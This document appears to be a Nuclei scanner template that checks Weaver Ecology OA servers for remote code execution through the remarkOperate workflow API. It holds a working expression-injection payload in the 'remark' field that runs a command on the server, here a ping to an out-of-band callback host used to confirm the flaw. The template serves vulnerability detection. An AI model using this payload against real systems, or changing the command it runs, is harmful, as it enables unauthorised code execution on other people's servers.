id: ecology-remarkoperate-rce

info:
  name: Ecology remarkOperate - Remote Code Execution
  author: qwtd
  severity: critical
  description: Ecology remarkOperate is vulnerable to remote code execution.
  metadata:
    max-request: 1
  tags: 泛微-协同办公OA

http:
  - raw:
      - |
        POST /api/workflow/reqform/remarkOperate HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
          "operate": "save",
          "field5": "5241,5240",
          "IsBeForwardSubmitAlready": "1",
          "IsBeForwardAlready": "0",
          "IsSubmitedOpinion": "1",
          "IsBeForwardTodo": "0",
          "forwardflag": "1",
          "requestid": "5288726",
          "nodeid": "11995",
          "f_weaver_belongto_userid": "5240",
          "f_weaver_belongto_usertype": "0",
          "signworkflowids": "",
          "signdocids": "",
          "remarkLocation": "",
          "remark": "${T(java.lang.Runtime).getRuntime().exec('ping {{interactsh-url}}')}",
          "remindTypes": "0,2"
        }

    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - http

